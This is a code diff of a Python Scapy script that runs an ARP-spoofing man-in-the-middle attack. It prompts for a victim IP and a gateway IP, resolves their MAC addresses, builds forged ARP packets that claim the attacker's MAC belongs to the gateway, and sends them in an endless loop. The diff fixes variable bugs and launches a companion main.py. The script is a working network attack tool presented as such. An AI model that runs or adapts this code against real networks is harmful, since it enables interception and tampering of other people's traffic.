@@ -1,11 +1,19 @@
 from scapy.all import *
 
+"""
 file = open("vIP.txt")
 vIP = file.read()
 file.close()
 
-#KAN waarschijn weg
-def ip_to_mac(IP, retry= 2, timeout=2):
+file = open("gatewayIP.txt")
+gatewayIP = file.read()
+file.close()
+"""
+vIP = raw_input("Victim IP address?")
+gatewayIP = raw_input("Gateway IP address?")
+
+
+def ip_to_mac(IP, retry= 10, timeout=2):
        
     #create inital ARP packet to send
     arp = ARP()
@@ -26,30 +34,34 @@ def ip_to_mac(IP, retry= 2, timeout=2):
 vMAC = ip_to_mac(vIP);
 macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)
 #vMAC = subprocess.check_output("arp -a " + vIP + " | awk '{print $4}' ", shell = True)
-gatewayIP = subprocess.check_output("route -n | awk '$1 == \"0.0.0.0\" {print $2}' ", shell = True)
-gatewayMac = subprocess.check_output("arp -n | awk '$1 == " + gatewayIP + "  {print $3}'", shell = True)
+#gatewayIP = subprocess.check_output("route -n | awk '$1 == \"0.0.0.0\" {print $2}' ", shell = True)
+#gatewayMac = subprocess.check_output("arp -n | awk '$1 == " + gatewayIP + "  {print $3}'", shell = True)
+
+gatewayMAC = ip_to_mac(gatewayIP)
 
 #Create arp packet for victim
 arpVictim = Ether() / ARP()
-arp[Ether].src = macAttacker
-arp[ARP].hwsrc = macAttacker
-arp[ARP].psrc = gatewayIP
-arp[ARP].hwdst = vMAC
-arp[ARP].pdst = vIP
+arpVictim[Ether].src = macAttacker
+arpVictim[ARP].hwsrc = macAttacker
+arpVictim[ARP].psrc = gatewayIP
+arpVictim[ARP].hwdst = vMAC
+arpVictim[ARP].pdst = vIP
 
 #Create arp packet for Gateway
 arpGateway = Ether() / ARP()
-arp[Ether].src = macAttacker
-arp[ARP].hwsrc = macAttacker
-arp[ARP].psrc = vIP
-arp[ARP].hwdst = gatewayMac
-arp[ARP].pdst = gatewayIP
+arpGateway[Ether].src = macAttacker
+arpGateway[ARP].hwsrc = macAttacker
+arpGateway[ARP].psrc = vIP
+arpGateway[ARP].hwdst = gatewayMAC
+arpGateway[ARP].pdst = gatewayIP
 
 
 def arpPoison():
     sendp(arpVictim, iface="enp0s3")
-    sendp(arpGateway, iface="enp0s3")
+    #sendp(arpGateway, iface="enp0s3")
     time.sleep(1)
+
+os.system("gnome-terminal -e 'python main.py'")
 
 while True:
     arpPoison()
